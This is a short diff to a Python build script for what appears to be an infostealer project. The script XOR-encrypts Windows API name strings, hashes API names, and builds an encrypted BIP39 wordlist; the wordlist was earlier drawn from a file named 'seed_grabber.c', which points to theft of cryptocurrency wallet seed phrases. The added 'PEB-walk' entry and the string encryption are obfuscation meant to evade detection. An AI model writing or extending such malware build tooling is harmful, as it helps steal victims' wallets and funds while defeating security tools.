@@ -347,6 +347,8 @@ def rewrite_encrypted_strings(key):
         ("SysAllocStringByteLen", "SysAllocStringByteLen"),
         ("SysFreeString", "SysFreeString"),
         ("SysStringByteLen", "SysStringByteLen"),
+        # crypt32 PEB-walk
+        ("CertFreeCertificateContext", "CertFreeCertificateContext"),
         # User32 GUI
         ("CreateWindowExW", "CreateWindowExW"),
         ("RegisterClassW", "RegisterClassW"),
@@ -763,17 +765,15 @@ def rewrite_hashes(seed, key):
 
 def rewrite_bip39(key):
     """Generate bip39_enc.h with XOR-encrypted BIP39 wordlist arrays."""
-    seed_grabber_c = os.path.join(ROOT, "src", "system", "seed_grabber.c")
+    words_file = os.path.join(ROOT, "tools", "bip39_words.txt")
     bip39_enc_h = os.path.join(ROOT, "include", "bip39_enc.h")
 
-    # Extract words from seed_grabber.c
-    with open(seed_grabber_c, "r", encoding="utf-8") as f:
-        content = f.read()
-    start = content.index("static const char *bip39_words[] = {")
-    brace_start = content.index("{", start)
-    brace_end = content.index("};", brace_start)
-    array_content = content[brace_start + 1 : brace_end]
-    words = re.findall(r'"([^"]+)"', array_content)
+    if not os.path.exists(words_file):
+        print("[!] bip39_words.txt not found, skipping BIP39 encryption")
+        return
+
+    with open(words_file, "r", encoding="utf-8") as f:
+        words = [line.strip() for line in f if line.strip()]
 
     n = len(words)
     lines = []
